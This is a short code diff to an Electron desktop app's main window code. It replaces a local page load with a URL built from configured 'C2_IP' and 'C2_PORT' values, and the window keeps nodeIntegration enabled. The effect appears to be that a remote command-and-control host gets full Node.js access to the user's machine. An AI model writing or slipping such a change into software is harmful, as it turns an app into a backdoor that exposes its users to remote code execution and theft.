@@ -1,5 +1,5 @@
 const { app, BrowserWindow } = require("electron");
-
+var config = require('./config')
 const server = require("./server");
 
 let mainWindow;
@@ -12,8 +12,8 @@ function createWindow() {
       nodeIntegration: true,
     },
   });
-
-  mainWindow.loadURL("http://localhost:3001");
+  var url = `http://${config.C2_IP}:${config.C2_PORT}`
+  mainWindow.loadURL(url);
   mainWindow.on("closed", function () {
     mainWindow = null;
   });
